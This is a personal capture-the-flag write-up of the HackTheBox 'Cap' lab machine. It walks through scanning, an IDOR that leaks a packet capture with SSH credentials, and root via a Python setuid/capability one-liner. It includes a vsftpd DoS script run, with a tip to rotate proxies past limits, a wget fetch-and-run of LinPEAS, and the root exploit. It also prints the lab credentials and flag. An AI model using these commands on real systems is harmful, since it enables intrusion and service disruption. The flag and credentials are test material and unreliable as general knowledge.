---
Category: 
Difficulty: Easy
Platform: HackTheBox
status: 
tags:
  - IDOR
  - LinPEAS
  - Burp-Suite
  - Whireshark
  - Linux
  - SetUID
---

>[!quote]
>Challenge description

# Plan



# Information Gathering

## Active Scanning - T1595
Use nmap for scan
```bash
sudo nmap -vvv -Pn -sCV -p-65535 --reason -oN cap.nmap 10.10.10.245
```

Discover port: 80 - HTTP, 22 - SSH, 21 - FTP

## Gather Victim Host Information. Software - T1592.002
Access FTP with user "anonymous" with password leave blank:

```bash
PORT   STATE SERVICE REASON         VERSION
21/tcp open  ftp     syn-ack ttl 63 vsftpd 3.0.3
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA)
80/tcp open  http    syn-ack ttl 63 Gunicorn
| http-methods: 
|_  Supported Methods: HEAD GET OPTIONS
|_http-server-header: gunicorn
```

Version of FTP machine used is **vsFTPd 3.0.3**:
- Use search port with `searchsploit` 

![[Hackthebox/attachments/Cap-2.png]]

Display content of exploit 49719
```bash
searchsploit 49719
```

![[Cap-3.png]]

![[Cap-4.png]]

But script error:

![[Cap-5.png]]

So i will use scipt is customed on github
```bash
git clone https://github.com/kuppamjohari/vsftpd-3.0.3-DoS.git
```
# Initial access
## Compromise Software Supply Chain - T1195.002
Implemant script to error dos of block legitial user:
```bash
python3 vsftpd-3.0.3-DoS/vsftpd3-0-3-DoS.py 10.10.10.245 21 44
```

![[Cap-6.png]]

When it's limited, just run this script from different proxies using proxychains, and it will work
addition line ip attack
```bash
sudo vim /etc/proxychains4.conf
```

![[Cap-7.png]]


## Software Deployment Tools - T1072
Cannot implement ftp

![[Cap-9.png]]

# Access Web 
![[Pasted image 20250808150357.png]]
## Bug 1

>[!bug] 
> Normal users start downloading from`index 1`, but they can manually access`index 0` and download `0.pcap`, which contains credentials. These credentials can be used to access FTP and SSH.


access ssh with username is `nathan` and password `Buck3tH4TF0RM3!`

Then start web server port 9000 on local with command
```bash
python3 -m http.server 9000
```

another machine want to download file so use command

```bash
wget http://10.10.14.43:9000/linpeas.sh
```

Change permission  `execute` for file `linpeas.sh`

```bash
chmod +x linpeas.sh
```

Run tool and record in file `linpeas.txt`

```bash
./linpeas.sh > linpeas.txt
```

First, I want to check for errors related to `setuid`.

![[Cap.png]]

## Bug 2

>[!bug]
> User Identification Variables
> [euid, ruid, suid - HackTricks](https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/euid-ruid-suid.html)

So check id

![[Bug-Bounty Hunting & Web Security Testing/attachments/Cap-1.png]]

![[Bug-Bounty Hunting & Web Security Testing/attachments/Cap-2.png]]

So now write script python `exploit.py`to set value for uid equal `0` this is root

```python
import os
os.setuid(0)
os.system("/bin/bash")
```

Run script and get flag

```bash
python3 exploit.py
cat /root/root.txt
```

``
# Flag

>[!success] Flag
> `a7627e5d94e261490903b6bd8d183e0f`

